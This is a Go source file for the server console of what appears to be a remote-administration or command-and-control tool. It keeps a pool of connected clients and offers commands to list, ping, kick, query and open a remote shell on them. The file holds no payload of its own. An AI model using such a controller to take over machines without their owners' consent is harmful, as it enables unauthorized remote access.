// server

package main

import (
	"bufio"
	"errors"
	"fmt"
	"log"
	"os"
	"strings"

	// loads enviroment variables from .env
	_ "github.com/joho/godotenv/autoload"
)

var clients = NewClients()
var logger *log.Logger
var api *Api = NewApi()

func main() {

	f := initLogger()
	defer f.Close()

	go api.Serve()

	pool := NewPool(os.Getenv("POOL_PORT"))

	go pool.Start()

	commandLoop()
}

// Initializes the logger. Returns the filedecriptor so the main function can close it when it finishes.
func initLogger() *os.File {

	f, err := os.OpenFile(os.Getenv("LOG_FILE"), os.O_RDWR|os.O_CREATE|os.O_APPEND, 0666)
	if err != nil {
		log.Fatalf("error opening file: %v", err)
	}

	logger = log.New(f, "", log.Ldate|log.Ltime)

	return f
}

// Get all info about the clients.
func info(clientId string) (string, error) {

	out := strings.Builder{}

	if clientId != "" {
		client, err := clients.GetClientById(clientId)

		if err != nil {
			return "", err
		}

		client.RequestInfo()

		out.WriteString(client.Info.String() + "\n")
	} else {
		clients.RequestInfo()

		for _, client := range clients.clientsMap {
			out.WriteString(client.Info.String() + "\n")
		}
	}

	return out.String(), nil
}

// List all connected clients.
func list() {

	out := strings.Builder{}

	for _, client := range clients.clientsMap {
		out.WriteString(client.String() + "\n")
	}

	fmt.Print(out.String())
}

// Kick a client.
func kick(clientId string) error {

	if len(clientId) == 0 {
		return errors.New("could not kick client: client id was not passed")
	}

	client, err := clients.GetClientById(clientId)

	if err != nil {
		return err
	}

	clients.RemoveClient(*client)

	return nil
}

// Start a shell on the command line.
func shell(clientId string) error {

	if len(clientId) == 0 {
		return errors.New("could not kick client: client id was not passed")
	}

	client, err := clients.GetClientById(clientId)

	if err != nil {
		return errors.New("could not initiate shell: client with that id is not in array")
	}

	shell := NewShell(client)

	err = shell.Start()

	if err != nil {
		return err
	}

	return nil
}

// Ping the client with clientId or if clientId == "", ping all connected clients.
// Returns the boolean return value is only true of ALL clients which were pinged, responded
func ping(clientId string) (string, bool, error) {

	out := strings.Builder{}
	allOk := true

	// user wants to ping a specific client
	if len(clientId) == 0 {
		oks := clients.Ping()

		for client, ok := range oks {
			if ok {
				out.WriteString(fmt.Sprintf("%s responded.\n", client.String()))
			} else {
				out.WriteString(fmt.Sprintf("%s did not respond or responded the wrong message.\n", client.String()))
				allOk = false
			}
		}

	} else {
		client, err := clients.GetClientById(clientId)

		if err != nil {
			return "", allOk, errors.New("could not ping client: client with that id is not in array")
		}

		ok := client.Ping()

		if ok {
			out.WriteString(fmt.Sprintf("%s responded.\n", client.String()))
		} else {
			out.WriteString(fmt.Sprintf("%s did not respond or responded the wrong message.\n", client.String()))
			allOk = false
		}
	}

	return out.String(), allOk, nil
}

func commandLoop() {
	reader := bufio.NewReader(os.Stdin)
	ctrlDCount := 0

	for {
		fmt.Print("☲ ")

		in, err := reader.ReadString('\n')

		if err != nil {
			ctrlDCount++
			if ctrlDCount > 1 {
				break
			}
			fmt.Println("Press Ctrl + D again, if you want to exit.")
			continue
		}

		in = strings.TrimSpace(in)
		split := strings.Split(in, " ")
		cmd := split[0]
		clientId := ""

		if len(split) > 1 {
			clientId = split[1]
		}

		if len(in) == 0 {
			continue
		}

		switch cmd {
		case "!info":
			out, err := info(clientId)
			if err != nil {
				fmt.Println(err)
			} else {
				fmt.Print(out)
			}
		case "!list":
			list()
		case "!kick":
			err := kick(clientId)
			if err != nil {
				fmt.Println(err)
			}
		case "!shell":
			err := shell(clientId)
			if err != nil {
				fmt.Println(err)
			}
		case "!ping":
			out, _, err := ping(clientId)
			if err != nil {
				fmt.Println(err)
			} else {
				fmt.Print(out)
			}
		default:
			fmt.Println("Command is unknown.")
		}
	}
}
